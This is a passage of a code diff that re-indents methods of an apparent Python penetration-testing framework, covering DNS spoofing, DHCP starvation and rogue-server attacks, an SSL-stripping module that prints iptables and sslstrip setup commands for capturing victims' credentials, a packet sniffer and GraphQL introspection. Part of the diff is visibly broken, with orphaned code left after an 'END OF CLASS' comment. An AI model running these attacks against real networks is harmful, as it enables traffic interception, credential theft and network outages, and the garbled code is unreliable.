+                print(f"{Fore.BLUE}ℹ  Operation cancelled{Style.RESET_ALL}")
+                return
+        
+        # Initialize database
+        if config['enable_database']:
             try:
-                from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, send, sr1
-                SCAPY_AVAILABLE = True
-            except ImportError:
-                print(f"{Fore.RED}✗ ERROR: Scapy not available{Style.RESET_ALL}")
-                print(f"{Fore.BLUE}ℹ  Install: pip3 install scapy{Style.RESET_ALL}\n")
-                return
-            
-            # Check root privileges
-            import os
-            if os.geteuid() != 0:
-                print(f"{Fore.RED}✗ ERROR: Root privileges required{Style.RESET_ALL}")
-                print(f"{Fore.BLUE}ℹ  Run with: sudo python3 kndys.py{Style.RESET_ALL}\n")
-                return
-            
-            # Load configuration
-            config = self._load_dns_spoof_config()
-            if not config:
-                print(f"{Fore.RED}✗ ERROR: Failed to load configuration{Style.RESET_ALL}")
-                return
-            
-            # Display configuration
-            self._display_dns_spoof_config(config)
-            
-            # Confirm operation
-            if config['confirm_spoof']:
-                response = input(f"\n{Fore.YELLOW}⚠  Proceed with DNS spoofing? (yes/no): {Style.RESET_ALL}")
-                if response.lower() not in ['yes', 'y']:
-                    print(f"{Fore.BLUE}ℹ  Operation cancelled{Style.RESET_ALL}")
-                    return
-            
-            # Initialize database
-            if config['enable_database']:
-                try:
-                    self._initialize_dns_database(config)
-                    print(f"\n{Fore.GREEN}✓ Database initialized{Style.RESET_ALL}")
-                except Exception as e:
-                    print(f"\n{Fore.YELLOW}⚠ WARNING: Database init failed - continuing without DB{Style.RESET_ALL}")
-            
-            # Initialize cache
-            if config['enable_cache']:
-                self._initialize_dns_cache(config)
-                print(f"{Fore.GREEN}✓ DNS cache initialized ({config['cache_size']} entries){Style.RESET_ALL}")
-            
-            # Load spoof domains
-            spoof_domains = self._load_spoof_domains(config)
-            if not spoof_domains and not config['wildcard_mode']:
-                print(f"\n{Fore.RED}✗ ERROR: No domains to spoof{Style.RESET_ALL}")
-                print(f"{Fore.BLUE}ℹ  Set 'spoof_domains' or enable 'wildcard_mode'{Style.RESET_ALL}")
-                return
-            
-            print(f"{Fore.GREEN}✓ Loaded {len(spoof_domains)} spoof domains{Style.RESET_ALL}")
-            
-            # Setup signal handlers
-            import signal
-            import sys
-            
-            def signal_handler(sig, frame):
-                print(f"\n\n{Fore.YELLOW}⚠  Interrupt received - cleaning up...{Style.RESET_ALL}\n")
-                self._cleanup_dns_spoof(config)
-                sys.exit(0)
-            
-            signal.signal(signal.SIGINT, signal_handler)
-            signal.signal(signal.SIGTERM, signal_handler)
-            
-            # Start DNS spoofing
-            print(f"\n{Fore.CYAN}━━━ STARTING DNS SPOOFING ━━━{Style.RESET_ALL}\n")
-            print(f"{Fore.YELLOW}→ Interface: {config['interface']}{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}→ Spoof IP: {config['spoof_ip']}{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}→ Wildcard Mode: {config['wildcard_mode']}{Style.RESET_ALL}")
-            print(f"{Fore.GREEN}→ DNS spoofing active - press Ctrl+C to stop{Style.RESET_ALL}\n")
-            
-            # Main spoofing loop
-            self._dns_spoof_loop(config, spoof_domains)
+                self._initialize_dns_database(config)
+                print(f"\n{Fore.GREEN}✓ Database initialized{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"\n{Fore.YELLOW}⚠ WARNING: Database init failed - continuing without DB{Style.RESET_ALL}")
+        
+        # Initialize cache
+        if config['enable_cache']:
+            self._initialize_dns_cache(config)
+            print(f"{Fore.GREEN}✓ DNS cache initialized ({config['cache_size']} entries){Style.RESET_ALL}")
+        
+        # Load spoof domains
+        spoof_domains = self._load_spoof_domains(config)
+        if not spoof_domains and not config['wildcard_mode']:
+            print(f"\n{Fore.RED}✗ ERROR: No domains to spoof{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ  Set 'spoof_domains' or enable 'wildcard_mode'{Style.RESET_ALL}")
+            return
+        
+        print(f"{Fore.GREEN}✓ Loaded {len(spoof_domains)} spoof domains{Style.RESET_ALL}")
+        
+        # Setup signal handlers
+        import signal
+        import sys
+        
+        def signal_handler(sig, frame):
+            print(f"\n\n{Fore.YELLOW}⚠  Interrupt received - cleaning up...{Style.RESET_ALL}\n")
+            self._cleanup_dns_spoof(config)
+            sys.exit(0)
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        signal.signal(signal.SIGTERM, signal_handler)
+        
+        # Start DNS spoofing
+        print(f"\n{Fore.CYAN}━━━ STARTING DNS SPOOFING ━━━{Style.RESET_ALL}\n")
+        print(f"{Fore.YELLOW}→ Interface: {config['interface']}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}→ Spoof IP: {config['spoof_ip']}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}→ Wildcard Mode: {config['wildcard_mode']}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}→ DNS spoofing active - press Ctrl+C to stop{Style.RESET_ALL}\n")
+        
+        # Main spoofing loop
+        self._dns_spoof_loop(config, spoof_domains)
     
     
         def _load_dns_spoof_config(self):
@@ -38367,104 +38367,104 @@ END:VCARD"""
                 f.write(html)
     
         
-        def run_dhcp_starvation(self):
-            """
-            Enterprise DHCP Starvation & Exhaustion Platform
-            Complete DHCP attack framework with pool exhaustion and rogue server deployment
-            """
-            from colorama import Fore, Style
-            import time
-            import random
-            
-            print(f"\n{Fore.CYAN}{'=' * 70}")
-            print(f"  DHCP STARVATION & EXHAUSTION PLATFORM - ENTERPRISE EDITION")
-            print(f"{'=' * 70}{Style.RESET_ALL}\n")
-            
-            # Check for scapy
+    def run_dhcp_starvation(self):
+        """
+        Enterprise DHCP Starvation & Exhaustion Platform
+        Complete DHCP attack framework with pool exhaustion and rogue server deployment
+        """
+        from colorama import Fore, Style
+        import time
+        import random
+        
+        print(f"\n{Fore.CYAN}{'=' * 70}")
+        print(f"  DHCP STARVATION & EXHAUSTION PLATFORM - ENTERPRISE EDITION")
+        print(f"{'=' * 70}{Style.RESET_ALL}\n")
+        
+        # Check for scapy
+        try:
+            from scapy.all import (
+                BOOTP, DHCP, Ether, IP, UDP, RandMAC, 
+                sendp, sniff, conf, get_if_hwaddr
+            )
+            SCAPY_AVAILABLE = True
+        except ImportError:
+            print(f"{Fore.RED}✗ ERROR: Scapy not available{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ  Install: pip3 install scapy{Style.RESET_ALL}\n")
+            return
+        
+        # Check root privileges
+        import os
+        if os.geteuid() != 0:
+            print(f"{Fore.RED}✗ ERROR: Root privileges required{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ  Run with: sudo python3 kndys.py{Style.RESET_ALL}\n")
+            return
+        
+        # Load configuration
+        config = self._load_dhcp_starvation_config()
+        if not config:
+            print(f"{Fore.RED}✗ ERROR: Failed to load configuration{Style.RESET_ALL}")
+            return
+        
+        # Display configuration
+        self._display_dhcp_starvation_config(config)
+        
+        # Confirm operation
+        if config['confirm_attack']:
+            response = input(f"\n{Fore.YELLOW}⚠  WARNING: This attack will exhaust DHCP pool and disrupt network!")
+            response2 = input(f"{Fore.YELLOW}   Proceed with DHCP starvation? (yes/no): {Style.RESET_ALL}")
+            if response2.lower() not in ['yes', 'y']:
+                print(f"{Fore.BLUE}ℹ  Operation cancelled{Style.RESET_ALL}")
+                return
+        
+        # Initialize database
+        if config['enable_database']:
             try:
-                from scapy.all import (
-                    BOOTP, DHCP, Ether, IP, UDP, RandMAC, 
-                    sendp, sniff, conf, get_if_hwaddr
-                )
-                SCAPY_AVAILABLE = True
-            except ImportError:
-                print(f"{Fore.RED}✗ ERROR: Scapy not available{Style.RESET_ALL}")
-                print(f"{Fore.BLUE}ℹ  Install: pip3 install scapy{Style.RESET_ALL}\n")
-                return
-            
-            # Check root privileges
-            import os
-            if os.geteuid() != 0:
-                print(f"{Fore.RED}✗ ERROR: Root privileges required{Style.RESET_ALL}")
-                print(f"{Fore.BLUE}ℹ  Run with: sudo python3 kndys.py{Style.RESET_ALL}\n")
-                return
-            
-            # Load configuration
-            config = self._load_dhcp_starvation_config()
-            if not config:
-                print(f"{Fore.RED}✗ ERROR: Failed to load configuration{Style.RESET_ALL}")
-                return
-            
-            # Display configuration
-            self._display_dhcp_starvation_config(config)
-            
-            # Confirm operation
-            if config['confirm_attack']:
-                response = input(f"\n{Fore.YELLOW}⚠  WARNING: This attack will exhaust DHCP pool and disrupt network!")
-                response2 = input(f"{Fore.YELLOW}   Proceed with DHCP starvation? (yes/no): {Style.RESET_ALL}")
-                if response2.lower() not in ['yes', 'y']:
-                    print(f"{Fore.BLUE}ℹ  Operation cancelled{Style.RESET_ALL}")
-                    return
-            
-            # Initialize database
-            if config['enable_database']:
-                try:
-                    self._initialize_dhcp_database(config)
-                    print(f"\n{Fore.GREEN}✓ Database initialized{Style.RESET_ALL}")
-                except Exception as e:
-                    print(f"\n{Fore.YELLOW}⚠ WARNING: Database init failed - continuing without DB{Style.RESET_ALL}")
-            
-            # Detect DHCP server
-            if not config['dhcp_server']:
-                print(f"{Fore.CYAN}→ Detecting DHCP server...{Style.RESET_ALL}")
-                dhcp_server = self._detect_dhcp_server(config)
-                if dhcp_server:
-                    config['dhcp_server'] = dhcp_server
-                    print(f"{Fore.GREEN}✓ DHCP server detected: {dhcp_server}{Style.RESET_ALL}")
-                else:
-                    print(f"{Fore.YELLOW}⚠ WARNING: No DHCP server detected - continuing anyway{Style.RESET_ALL}")
-            
-            # Setup signal handlers
-            import signal
-            import sys
-            
-            def signal_handler(sig, frame):
-                print(f"\n\n{Fore.YELLOW}⚠  Interrupt received - cleaning up...{Style.RESET_ALL}\n")
-                self._cleanup_dhcp_starvation(config)
-                sys.exit(0)
-            
-            signal.signal(signal.SIGINT, signal_handler)
-            signal.signal(signal.SIGTERM, signal_handler)
-            
-            # Start DHCP starvation attack
-            print(f"\n{Fore.CYAN}━━━ STARTING DHCP STARVATION ATTACK ━━━{Style.RESET_ALL}\n")
-            print(f"{Fore.YELLOW}→ Interface: {config['interface']}{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}→ Attack Mode: {config['attack_mode']}{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}→ Request Count: {config['request_count']}{Style.RESET_ALL}")
-            print(f"{Fore.RED}⚠  Attack will exhaust DHCP IP pool{Style.RESET_ALL}")
-            print(f"{Fore.GREEN}→ Press Ctrl+C to stop{Style.RESET_ALL}\n")
-            
-            # Execute attack based on mode
-            if config['attack_mode'] == 'starvation':
-                self._execute_starvation_attack(config)
-            elif config['attack_mode'] == 'dos':
-                self._execute_dos_attack(config)
-            elif config['attack_mode'] == 'rogue':
-                self._execute_rogue_server_attack(config)
-            elif config['attack_mode'] == 'hybrid':
-                self._execute_hybrid_attack(config)
+                self._initialize_dhcp_database(config)
+                print(f"\n{Fore.GREEN}✓ Database initialized{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"\n{Fore.YELLOW}⚠ WARNING: Database init failed - continuing without DB{Style.RESET_ALL}")
+        
+        # Detect DHCP server
+        if not config['dhcp_server']:
+            print(f"{Fore.CYAN}→ Detecting DHCP server...{Style.RESET_ALL}")
+            dhcp_server = self._detect_dhcp_server(config)
+            if dhcp_server:
+                config['dhcp_server'] = dhcp_server
+                print(f"{Fore.GREEN}✓ DHCP server detected: {dhcp_server}{Style.RESET_ALL}")
             else:
-                print(f"{Fore.RED}✗ ERROR: Invalid attack mode: {config['attack_mode']}{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}⚠ WARNING: No DHCP server detected - continuing anyway{Style.RESET_ALL}")
+        
+        # Setup signal handlers
+        import signal
+        import sys
+        
+        def signal_handler(sig, frame):
+            print(f"\n\n{Fore.YELLOW}⚠  Interrupt received - cleaning up...{Style.RESET_ALL}\n")
+            self._cleanup_dhcp_starvation(config)
+            sys.exit(0)
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        signal.signal(signal.SIGTERM, signal_handler)
+        
+        # Start DHCP starvation attack
+        print(f"\n{Fore.CYAN}━━━ STARTING DHCP STARVATION ATTACK ━━━{Style.RESET_ALL}\n")
+        print(f"{Fore.YELLOW}→ Interface: {config['interface']}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}→ Attack Mode: {config['attack_mode']}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}→ Request Count: {config['request_count']}{Style.RESET_ALL}")
+        print(f"{Fore.RED}⚠  Attack will exhaust DHCP IP pool{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}→ Press Ctrl+C to stop{Style.RESET_ALL}\n")
+        
+        # Execute attack based on mode
+        if config['attack_mode'] == 'starvation':
+            self._execute_starvation_attack(config)
+        elif config['attack_mode'] == 'dos':
+            self._execute_dos_attack(config)
+        elif config['attack_mode'] == 'rogue':
+            self._execute_rogue_server_attack(config)
+        elif config['attack_mode'] == 'hybrid':
+            self._execute_hybrid_attack(config)
+        else:
+            print(f"{Fore.RED}✗ ERROR: Invalid attack mode: {config['attack_mode']}{Style.RESET_ALL}")
     
     
         def _load_dhcp_starvation_config(self):
@@ -39352,122 +39352,122 @@ END:VCARD"""
             print(f"\n{Fore.GREEN}✓ Network disruption configuration applied{Style.RESET_ALL}")
     
         
-        def run_ssl_strip(self):
-            """SSL stripping attack"""
-            interface = self.module_options.get('interface', 'eth0')
-            port = self.module_options.get('port', '8080')
-            
-            print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}║ SSL STRIP ATTACK ║{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
-            
-            print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}Port: {Fore.WHITE}{port}{Style.RESET_ALL}\n")
-            
-            print(f"{Fore.YELLOW} Prerequisites:{Style.RESET_ALL}")
-            print(f" 1. Active MITM (ARP spoofing)")
-            print(f" 2. IP forwarding enabled")
-            print(f" 3. iptables redirect setup\n")
-            
-            print(f"{Fore.BLUE}Setup steps:{Style.RESET_ALL}\n")
-            
-            print(f"{Fore.CYAN}# 1. Enable IP forwarding")
-            print(f"echo 1 > /proc/sys/net/ipv4/ip_forward")
-            print(f"")
-            print(f"# 2. Redirect traffic to sslstrip")
-            print(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {port}")
-            print(f"")
-            print(f"# 3. Run sslstrip")
-            print(f"sslstrip -l {port} -w sslstrip.log")
-            print(f"")
-            print(f"# 4. Start ARP spoofing")
-            print(f"# use network/arp_spoof{Style.RESET_ALL}\n")
-            
-            print(f"{Fore.GREEN}ℹ What it does:{Style.RESET_ALL}")
-            print(f" • Intercepts HTTPS requests")
-            print(f" • Serves HTTP version to victim")
-            print(f" • Victim sees HTTP, you see credentials")
-            print(f" • Defeats basic SSL{Style.RESET_ALL}\n")
-            
-            print(f"{Fore.YELLOW}Note: Modern browsers have HSTS protection{Style.RESET_ALL}")
+    def run_ssl_strip(self):
+        """SSL stripping attack"""
+        interface = self.module_options.get('interface', 'eth0')
+        port = self.module_options.get('port', '8080')
         
-        def run_packet_sniffer(self):
-            """
-            Enterprise Packet Sniffer & Network Analysis Platform
-            Real-time traffic capture, deep packet inspection, and threat detection
-            """
-            from colorama import Fore, Style
-            import time
-            
+        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ SSL STRIP ATTACK ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+        
+        print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}Port: {Fore.WHITE}{port}{Style.RESET_ALL}\n")
+        
+        print(f"{Fore.YELLOW} Prerequisites:{Style.RESET_ALL}")
+        print(f" 1. Active MITM (ARP spoofing)")
+        print(f" 2. IP forwarding enabled")
+        print(f" 3. iptables redirect setup\n")
+        
+        print(f"{Fore.BLUE}Setup steps:{Style.RESET_ALL}\n")
+        
+        print(f"{Fore.CYAN}# 1. Enable IP forwarding")
+        print(f"echo 1 > /proc/sys/net/ipv4/ip_forward")
+        print(f"")
+        print(f"# 2. Redirect traffic to sslstrip")
+        print(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {port}")
+        print(f"")
+        print(f"# 3. Run sslstrip")
+        print(f"sslstrip -l {port} -w sslstrip.log")
+        print(f"")
+        print(f"# 4. Start ARP spoofing")
+        print(f"# use network/arp_spoof{Style.RESET_ALL}\n")
+        
+        print(f"{Fore.GREEN}ℹ What it does:{Style.RESET_ALL}")
+        print(f" • Intercepts HTTPS requests")
+        print(f" • Serves HTTP version to victim")
+        print(f" • Victim sees HTTP, you see credentials")
+        print(f" • Defeats basic SSL{Style.RESET_ALL}\n")
+        
+        print(f"{Fore.YELLOW}Note: Modern browsers have HSTS protection{Style.RESET_ALL}")
+    
+    def run_packet_sniffer(self):
+        """
+        Enterprise Packet Sniffer & Network Analysis Platform
+        Real-time traffic capture, deep packet inspection, and threat detection
+        """
+        from colorama import Fore, Style
+        import time
+        
+        print(f"\n{Fore.CYAN}{'=' * 80}")
+        print(f"  ENTERPRISE PACKET SNIFFER & NETWORK ANALYSIS PLATFORM")
+        print(f"{'=' * 80}{Style.RESET_ALL}\n")
+        
+        # Load configuration
+        print(f"{Fore.CYAN}━━━ LOADING CONFIGURATION ━━━{Style.RESET_ALL}\n")
+        config = self._load_packet_sniffer_config()
+        
+        if not config:
+            print(f"{Fore.RED}✗ Configuration load failed{Style.RESET_ALL}")
+            return
+        
+        # Display configuration
+        self._display_packet_sniffer_config(config)
+        
+        # Check dependencies
+        print(f"\n{Fore.CYAN}━━━ CHECKING DEPENDENCIES ━━━{Style.RESET_ALL}\n")
+        if not self._check_packet_sniffer_dependencies(config):
+            return
+        
+        # Initialize database
+        if config['enable_database']:
+            print(f"\n{Fore.CYAN}━━━ INITIALIZING DATABASE ━━━{Style.RESET_ALL}\n")
+            if not self._initialize_packet_sniffer_database(config):
+                print(f"{Fore.RED}✗ Database initialization failed{Style.RESET_ALL}")
+                return
+        
+        # Validate interface
+        print(f"\n{Fore.CYAN}━━━ VALIDATING NETWORK INTERFACE ━━━{Style.RESET_ALL}\n")
+        if not self._validate_capture_interface(config):
+            return
+        
+        # Setup capture environment
+        print(f"\n{Fore.CYAN}━━━ PREPARING CAPTURE ENVIRONMENT ━━━{Style.RESET_ALL}\n")
+        if not self._setup_capture_environment(config):
+            return
+        
+        # Display capture plan
+        self._display_capture_plan(config)
+        
+        # Confirmation
+        if config['require_confirmation']:
+            response = input(f"\n{Fore.YELLOW}Start packet capture? [y/N]: {Style.RESET_ALL}").strip().lower()
+            if response != 'y':
+                print(f"{Fore.YELLOW}ℹ  Capture cancelled{Style.RESET_ALL}")
+                return
+        
+        try:
+            # Start capture
             print(f"\n{Fore.CYAN}{'=' * 80}")
-            print(f"  ENTERPRISE PACKET SNIFFER & NETWORK ANALYSIS PLATFORM")
+            print(f"  PACKET CAPTURE ACTIVE")
             print(f"{'=' * 80}{Style.RESET_ALL}\n")
             
-            # Load configuration
-            print(f"{Fore.CYAN}━━━ LOADING CONFIGURATION ━━━{Style.RESET_ALL}\n")
-            config = self._load_packet_sniffer_config()
+            self._execute_packet_capture(config)
             
-            if not config:
-                print(f"{Fore.RED}✗ Configuration load failed{Style.RESET_ALL}")
-                return
-            
-            # Display configuration
-            self._display_packet_sniffer_config(config)
-            
-            # Check dependencies
-            print(f"\n{Fore.CYAN}━━━ CHECKING DEPENDENCIES ━━━{Style.RESET_ALL}\n")
-            if not self._check_packet_sniffer_dependencies(config):
-                return
-            
-            # Initialize database
-            if config['enable_database']:
-                print(f"\n{Fore.CYAN}━━━ INITIALIZING DATABASE ━━━{Style.RESET_ALL}\n")
-                if not self._initialize_packet_sniffer_database(config):
-                    print(f"{Fore.RED}✗ Database initialization failed{Style.RESET_ALL}")
-                    return
-            
-            # Validate interface
-            print(f"\n{Fore.CYAN}━━━ VALIDATING NETWORK INTERFACE ━━━{Style.RESET_ALL}\n")
-            if not self._validate_capture_interface(config):
-                return
-            
-            # Setup capture environment
-            print(f"\n{Fore.CYAN}━━━ PREPARING CAPTURE ENVIRONMENT ━━━{Style.RESET_ALL}\n")
-            if not self._setup_capture_environment(config):
-                return
-            
-            # Display capture plan
-            self._display_capture_plan(config)
-            
-            # Confirmation
-            if config['require_confirmation']:
-                response = input(f"\n{Fore.YELLOW}Start packet capture? [y/N]: {Style.RESET_ALL}").strip().lower()
-                if response != 'y':
-                    print(f"{Fore.YELLOW}ℹ  Capture cancelled{Style.RESET_ALL}")
-                    return
-            
-            try:
-                # Start capture
-                print(f"\n{Fore.CYAN}{'=' * 80}")
-                print(f"  PACKET CAPTURE ACTIVE")
-                print(f"{'=' * 80}{Style.RESET_ALL}\n")
-                
-                self._execute_packet_capture(config)
-                
-            except KeyboardInterrupt:
-                print(f"\n\n{Fore.YELLOW}━━━ CAPTURE INTERRUPTED ━━━{Style.RESET_ALL}\n")
-            
-            except Exception as e:
-                print(f"\n{Fore.RED}✗ Capture error: {str(e)}{Style.RESET_ALL}")
-                import traceback
-                if config.get('debug_mode'):
-                    traceback.print_exc()
-            
-            finally:
-                # Cleanup and reporting
-                print(f"\n{Fore.CYAN}━━━ FINALIZING CAPTURE ━━━{Style.RESET_ALL}\n")
-                self._cleanup_packet_sniffer(config)
+        except KeyboardInterrupt:
+            print(f"\n\n{Fore.YELLOW}━━━ CAPTURE INTERRUPTED ━━━{Style.RESET_ALL}\n")
         
+        except Exception as e:
+            print(f"\n{Fore.RED}✗ Capture error: {str(e)}{Style.RESET_ALL}")
+            import traceback
+            if config.get('debug_mode'):
+                traceback.print_exc()
+        
+        finally:
+            # Cleanup and reporting
+            print(f"\n{Fore.CYAN}━━━ FINALIZING CAPTURE ━━━{Style.RESET_ALL}\n")
+            self._cleanup_packet_sniffer(config)
+    
         def _load_packet_sniffer_config(self):
             """Load and validate packet sniffer configuration"""
             try:
@@ -41051,136 +41051,136 @@ END:VCARD"""
         
         # ============ WEB APPLICATION MODULES ============
         
-        def run_graphql_introspection_basic(self):
-            """Basic GraphQL introspection test (orphaned code recovered)"""
-            from colorama import Fore, Style
-            
-            # Get configuration from module_options
-            url = self.module_options.get('url', 'http://localhost:4000/graphql')
-            output = self.module_options.get('output', 'graphql_schema.json')
-            
-            print(f"{Fore.YELLOW}Endpoint: {Fore.WHITE}{url}{Style.RESET_ALL}\n")
-            
-            introspection_query = """{
+    def run_graphql_introspection_basic(self):
+        """Basic GraphQL introspection test (orphaned code recovered)"""
+        from colorama import Fore, Style
+        
+        # Get configuration from module_options
+        url = self.module_options.get('url', 'http://localhost:4000/graphql')
+        output = self.module_options.get('output', 'graphql_schema.json')
+        
+        print(f"{Fore.YELLOW}Endpoint: {Fore.WHITE}{url}{Style.RESET_ALL}\n")
+        
+        introspection_query = """{
       __schema {
-        types {
+    types {
+      name
+      fields {
+        name
+        type {
           name
-          fields {
-            name
-            type {
-              name
-              kind
-            }
-          }
-        }
-        queryType {
-          name
-        }
-        mutationType {
-          name
+          kind
         }
       }
+    }
+    queryType {
+      name
+    }
+    mutationType {
+      name
+    }
+      }
     }"""
+        
+        print(f"{Fore.CYAN}Introspection query:{Style.RESET_ALL}\n{Fore.WHITE}{introspection_query}{Style.RESET_ALL}\n")
+        
+        try:
+            response = requests.post(
+                url,
+                json={'query': introspection_query},
+                headers={'Content-Type': 'application/json'},
+                timeout=10,
+                verify=False
+            )
             
-            print(f"{Fore.CYAN}Introspection query:{Style.RESET_ALL}\n{Fore.WHITE}{introspection_query}{Style.RESET_ALL}\n")
-            
-            try:
-                response = requests.post(
-                    url,
-                    json={'query': introspection_query},
-                    headers={'Content-Type': 'application/json'},
-                    timeout=10,
-                    verify=False
-                )
+            if response.status_code == 200:
+                data = response.json()
                 
-                if response.status_code == 200:
-                    data = response.json()
+                with open(output, 'w') as f:
+                    json.dump(data, f, indent=2)
+                
+                print(f"{Fore.GREEN} Schema retrieved!{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}→ Saved to: {Fore.WHITE}{output}{Style.RESET_ALL}\n")
+                
+                if 'data' in data and '__schema' in data['data']:
+                    types = data['data']['__schema']['types']
+                    print(f"{Fore.BLUE}Found {len(types)} types{Style.RESET_ALL}\n")
                     
-                    with open(output, 'w') as f:
-                        json.dump(data, f, indent=2)
-                    
-                    print(f"{Fore.GREEN} Schema retrieved!{Style.RESET_ALL}")
-                    print(f"{Fore.CYAN}→ Saved to: {Fore.WHITE}{output}{Style.RESET_ALL}\n")
-                    
-                    if 'data' in data and '__schema' in data['data']:
-                        types = data['data']['__schema']['types']
-                        print(f"{Fore.BLUE}Found {len(types)} types{Style.RESET_ALL}\n")
+                    print(f"{Fore.GREEN}Sample types:{Style.RESET_ALL}")
+                    for t in types[:5]:
+                        print(f" • {Fore.CYAN}{t['name']}{Style.RESET_ALL}")
                         
-                        print(f"{Fore.GREEN}Sample types:{Style.RESET_ALL}")
-                        for t in types[:5]:
-                            print(f" • {Fore.CYAN}{t['name']}{Style.RESET_ALL}")
-                            
-                else:
-                    print(f"{Fore.RED} Introspection may be disabled{Style.RESET_ALL}")
-                    print(f"{Fore.YELLOW}Status: {response.status_code}{Style.RESET_ALL}")
-                    
-            except Exception as e:
-                print(f"{Fore.RED}✗ Error: {str(e)}{Style.RESET_ALL}")
-        
-        # ============ END OF CLASS ============
-                print(f"{Fore.RED} Error: {str(e)}{Style.RESET_ALL}")
-            
-            print(f"\n{Fore.BLUE}Common GraphQL attacks:{Style.RESET_ALL}")
-            print(f" • Introspection (schema disclosure)")
-            print(f" • Nested queries (DoS)")
-            print(f" • Batch attacks")
-            print(f" • Field suggestion abuse")
-            print(f" • Authorization bypass")
-            print(f"\n{Fore.GREEN}ℹ Tools:{Style.RESET_ALL}")
-            print(f" • GraphQL Voyager - Visualize schema")
-            print(f" • Altair - GraphQL client")
-            print(f" • InQL Scanner - Burp extension")
-        
-        def run_evidence_collector(self):
-            """Collect evidence and screenshots"""
-            session_id = self.module_options.get('session', '1')
-            output = self.module_options.get('output', 'evidence.zip')
-            
-            print(f"{Fore.CYAN}[*] Collecting evidence from session {session_id}{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}[*] Output: {output}{Style.RESET_ALL}\n")
-            
-            evidence_dir = f"evidence_{int(time.time())}"
-            os.makedirs(evidence_dir, exist_ok=True)
-            
-            print(f"{Fore.BLUE}[*] Collecting system information...{Style.RESET_ALL}")
-            sysinfo = {
-                'hostname': platform.node(),
-                'system': platform.system(),
-                'release': platform.release(),
-                'version': platform.version(),
-                'machine': platform.machine(),
-                'processor': platform.processor(),
-                'timestamp': datetime.now().isoformat()
-            }
-            
-            with open(os.path.join(evidence_dir, 'sysinfo.json'), 'w') as f:
-                json.dump(sysinfo, f, indent=2)
-            
-            print(f"{Fore.GREEN}[+] System information collected{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}[*] Collecting network information...{Style.RESET_ALL}")
-            try:
-                result = subprocess.run('ifconfig || ip addr', shell=True, capture_output=True, text=True)
-                with open(os.path.join(evidence_dir, 'network.txt'), 'w') as f:
-                    f.write(result.stdout)
-                print(f"{Fore.GREEN}[+] Network information collected{Style.RESET_ALL}")
-            except Exception as e:
-                print(f"{Fore.YELLOW}[!] Could not collect network info: {str(e)}{Style.RESET_ALL}")
-            
-            print(f"{Fore.BLUE}[*] Creating archive...{Style.RESET_ALL}")
-            try:
-                with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                    for root, dirs, files in os.walk(evidence_dir):
-                        for file in files:
-                            file_path = os.path.join(root, file)
-                            arcname = os.path.relpath(file_path, evidence_dir)
-                            zipf.write(file_path, arcname)
+            else:
+                print(f"{Fore.RED} Introspection may be disabled{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}Status: {response.status_code}{Style.RESET_ALL}")
                 
-                print(f"{Fore.GREEN}[+] Evidence archived: {output}{Style.RESET_ALL}")
-                import shutil
-                shutil.rmtree(evidence_dir)
-            except Exception as e:
-                print(f"{Fore.RED}[!] Error creating archive: {str(e)}{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}✗ Error: {str(e)}{Style.RESET_ALL}")
+    
+    # ============ END OF CLASS ============
+            print(f"{Fore.RED} Error: {str(e)}{Style.RESET_ALL}")
         
+        print(f"\n{Fore.BLUE}Common GraphQL attacks:{Style.RESET_ALL}")
+        print(f" • Introspection (schema disclosure)")
+        print(f" • Nested queries (DoS)")
+        print(f" • Batch attacks")
+        print(f" • Field suggestion abuse")
+        print(f" • Authorization bypass")
+        print(f"\n{Fore.GREEN}ℹ Tools:{Style.RESET_ALL}")
+        print(f" • GraphQL Voyager - Visualize schema")
+        print(f" • Altair - GraphQL client")
+        print(f" • InQL Scanner - Burp extension")
+    
+    def run_evidence_collector(self):
+        """Collect evidence and screenshots"""
+        session_id = self.module_options.get('session', '1')
+        output = self.module_options.get('output', 'evidence.zip')
+        
+        print(f"{Fore.CYAN}[*] Collecting evidence from session {session_id}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Output: {output}{Style.RESET_ALL}\n")
+        
+        evidence_dir = f"evidence_{int(time.time())}"
+        os.makedirs(evidence_dir, exist_ok=True)
+        
+        print(f"{Fore.BLUE}[*] Collecting system information...{Style.RESET_ALL}")
+        sysinfo = {
+            'hostname': platform.node(),
+            'system': platform.system(),
+            'release': platform.release(),
+            'version': platform.version(),
+            'machine': platform.machine(),
+            'processor': platform.processor(),
